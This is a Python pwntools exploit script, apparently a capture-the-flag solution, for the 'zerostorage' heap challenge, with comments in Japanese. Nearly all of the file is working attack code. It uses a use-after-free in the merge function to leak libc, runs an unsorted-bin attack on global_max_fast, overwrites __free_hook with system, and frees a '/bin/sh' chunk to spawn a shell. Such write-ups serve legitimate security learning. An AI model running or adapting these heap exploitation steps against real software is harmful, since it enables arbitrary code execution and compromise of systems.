#!/usr/bin/env python3 
from pwn import *
import warnings
warnings.simplefilter("ignore")

target = process("./zerostorage")
glibc = ELF("libc-2.23.so")
gdb.attach(target, gdbscript="b __printf_chk")

def insert(length, data):
    target.recvuntil("Your choice: ")
    target.sendline("1")
    target.recvuntil("Length of new entry: ")
    target.sendline(str(length))
    target.recvuntil("Enter your data: ")
    target.sendline(data)
    print(target.recvline())

def update(id, length, data):
    target.recvuntil("Your choice: ")
    target.sendline("2")
    target.recvuntil("Entry ID: ")
    target.sendline(str(id))
    target.recvuntil("Length of entry: ")
    target.sendline(str(length))
    target.recvuntil("Enter your data: ")
    target.sendline(data)
    print(target.recvline())

def merge(id1, id2):
    target.recvuntil("Your choice: ")
    target.sendline("3")
    target.recvuntil("Merge from Entry ID: ")
    target.sendline(str(id1))
    target.recvuntil("Merge to Entry ID: ")
    target.sendline(str(id2))
    print(target.recvline())

def delete(id):
    target.recvuntil("Your choice: ")
    target.sendline("4")
    target.recvuntil("Entry ID: ")
    target.sendline(str(id))

def view(id):
    target.recvuntil("Your choice: ")
    target.sendline("5")
    target.recvuntil("Entry ID: ")
    target.sendline(str(id))
    target.recvline()
    string = target.recvline()
    return string

a = b"a" * 0x20
b = b"b" * 0xfc
insert(0x20, a) # 0
insert(0xfc, b) # 1

#(1)バグを利用してuse after free
merge(0, 0) # 2
#leakから各アドレスを計算
leak = u64(view(2)[0:8])
libc = leak - 0x3c4b78
global_max_fast = leak + 0x1c80
system = libc + glibc.symbols["system"]
free_hook = libc + glibc.symbols["__free_hook"]

print("[*]leak            = ", hex(leak))
print("[*]libc            = ", hex(libc))
print("[*]global_max_fast = ", hex(global_max_fast))
print("[*]system          = ", hex(system))
print("[*]free_hook       = ", hex(free_hook))
log.info("First step is done")

#(2)main_arenaのbkをglobal_max_fastのアドレスに書き換える
string = b"aaaaaaaa" + p64(global_max_fast - 0x10)
string += b"A" * (0x20 - len(string))
update(2, 0x20, string)
#その後同じサイズで確保するとbkの位置(global_max_fast)にチャンクのアドレスが書き込まれ
#デカいサイズのfastbinが解放される(本来は0x80まで)
#ここでfreeする0の位置に/bin/shを書き込んでおく
payload1 = b"/bin/sh\x00"
payload1 += b"B" * (0x20 - len(payload1))
insert(0x20, payload1)
log.info("Second step is done")

#(3)free_hook-0x59をbkに書き込む
merge(1, 1) #3
string1 = p64(free_hook - 0x59)
string1 += b"A" * (0x1f7 - len(string1))
update(3, 0x1f8, string1)
#サイズを確保したときfree_hook-0x59の位置にチャンクアドレスが書き込まれる
insert(0x1f8, b"Q"*0x1f7)
print("Now check ", hex(free_hook-0x59))
#もう一度確保するとfree_hook-0x59の位置にチャンクができる
payload = b"\x00" * 0x49
payload += p64(system)
payload += b"\x00" * (0x1f7 - len(payload))
insert(0x1f8, payload)
print("Now check ", hex(free_hook-0x59))

delete(0)

target.interactive()